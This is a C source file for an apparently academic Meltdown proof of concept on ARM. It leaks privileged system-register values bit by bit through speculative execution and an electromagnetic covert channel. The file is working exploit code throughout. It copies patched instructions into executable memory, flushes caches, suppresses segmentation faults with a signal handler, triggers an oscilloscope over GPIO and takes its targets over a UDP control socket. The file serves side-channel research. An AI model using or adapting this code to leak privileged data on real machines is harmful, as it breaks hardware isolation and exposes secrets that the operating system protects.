/*
  Copyright (c) 2023, Jesse De Meulemeester
  Copyright (c) 2018, Cosmin Gorgovan <code at cosmin.me.uk>
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:
      * Redistributions of source code must retain the above copyright
        notice, this list of conditions and the following disclaimer.
      * Redistributions in binary form must reproduce the above copyright
        notice, this list of conditions and the following disclaimer in the
        documentation and/or other materials provided with the distribution.
      * Neither the name of the copyright holder nor the
        names of its contributors may be used to endorse or promote products
        derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
  DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
  ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

// Meltdown POC that extracts the values of system registers through an EM
// covert channel using instructions with operand-dependent timings
//
// This POC is adapted from spec_poc_arm by Cosim Gorgovan:
// https://github.com/lgeek/spec_poc_arm
//
// Last Modified: 2022-10-04

#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

#include "utils.h"
#include "gpio.h"


#define zrbf_stride (8 * 1024/sizeof(uintptr_t))
const size_t zrbf_size = 10 * zrbf_stride * sizeof(uintptr_t);

uintptr_t *zrbf;
uint32_t *codebuf;
#define CODE_SIZE 768

typedef void (*spec_read_fn)(void *probe_buf, void *miss_buf, uint64_t bit);
spec_read_fn do_spec_read;
extern void spec_read(void *probe_buf, void *miss_buf, uint64_t bit);

void flush_mult(void *addr, size_t n, size_t stride) {
  for (int i = 0; i < n; i+= 1) {
    asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
    addr += stride;
  }
  asm volatile("DSB SY");
}

void get_value(int i, siginfo_t *info, void *ctx) {
  ucontext_t *c = (ucontext_t *)ctx;
  c->uc_mcontext.pc += 528;  // (4 + 128) * 4
}

void __attribute__ ((noinline)) leak_register_bit(void *probe_buf, void *miss_buf, int bit, uint32_t mrs_code) {
  memcpy(codebuf, spec_read, CODE_SIZE);

  assert(codebuf[7] == 0xd503201f);
  codebuf[7] = mrs_code;
  __clear_cache(codebuf, codebuf + CODE_SIZE + 1); 

  NOP128

  gpio_set(16);                            // Trigger the oscilloscope
  do_spec_read(probe_buf, miss_buf, bit);  // Leak the bit
}


int main(int argc, const char **argv) {
  struct sigaction act;
  act.sa_sigaction = get_value;
  sigemptyset(&act.sa_mask);
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &act, NULL); 

  codebuf = mmap(NULL, 4096, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  assert(codebuf != MAP_FAILED);
  do_spec_read = (spec_read_fn)codebuf;

  // Initialize the dereference chain which, at the end, will contain the length of the
  // accessible data
  zrbf = mmap(NULL, zrbf_size, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  assert(zrbf != MAP_FAILED);
  zrbf[0] = 0; 
  // set up the dereference chain used to stall execution
  for (int i = 1; i < 10; i++) {
    zrbf[i*zrbf_stride] = (uintptr_t)&zrbf[(i-1)*zrbf_stride];
  }

  uint8_t buf[8];

  int bit = 0;
  uint32_t mrs_code = 0;

  // Initialize the GPIO pin
  gpio_init();
  gpio_fsel(16, OUTPUT); 

  // Initialize the UDP interface
  initSockServer(10000);

  while (1) {
    // The bit to access and the msr code corresponding to the register will be
    // send through the UDP interface
    receive_buf(buf, sizeof(buf));
    
    memcpy(&bit, &buf[0], 4);
    memcpy(&mrs_code, &buf[4], 4);

    // Prepare the pointer chase
    flush_mult(zrbf, 5, zrbf_stride*sizeof(uintptr_t));
   
    NOP128

    leak_register_bit(NULL, &zrbf[zrbf_stride*3], bit, mrs_code);
    gpio_clear(16);

    NOP1024

    // Write something back to let the other program know we are done
    reply_buf(buf, sizeof(buf));
  }
}
